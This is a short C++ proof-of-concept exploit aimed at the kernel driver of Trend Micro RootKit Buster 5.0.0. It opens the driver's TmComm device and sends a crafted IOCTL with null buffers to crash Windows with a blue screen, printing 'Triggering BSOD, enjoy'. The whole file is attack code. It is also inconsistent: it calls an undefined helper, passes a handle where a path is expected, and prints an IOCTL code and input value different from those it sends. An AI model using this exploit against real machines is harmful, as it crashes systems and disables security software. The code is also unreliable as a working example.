#include <windows.h>
#include <iostream>

#define DEVICE_SYMBOLIC_LINK "\\\\.\\TmComm"

int WinMain(HINSTANCE hInstance,
            HINSTANCE hPrevInstance,
            LPSTR lpCmdLine,
            int nShowCmd){
            
    HANDLE device_handle = get_device_handle(DEVICE_SYMBOLIC_LINK);

    std::cout << "Trend Micro RootKit Buster V5.0.0 - IOCTL BSOD\n";
    std::cout << "Sending 0xffff0000 to the IOCTL: 0x900040df\n";
    Sleep(2);

    HANDLE hDevice;
    DWORD nbBytes;
    hDevice = CreateFileA(device_handle, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

    std::cout << "Triggering BSOD, enjoy";
    
    int reSend = DeviceIoControl(hDevice, 0x9000402b, (LPVOID)0, 0x0, (LPVOID)0, 0x0, &nbBytes, NULL);

    if(reSend == 1){
        std::cout << "POC sucess";
    } else {
        std::cout << "[!] POC failed! - " << GetLastError();
    }
    CloseHandle(hDevice);

    return 0;
}
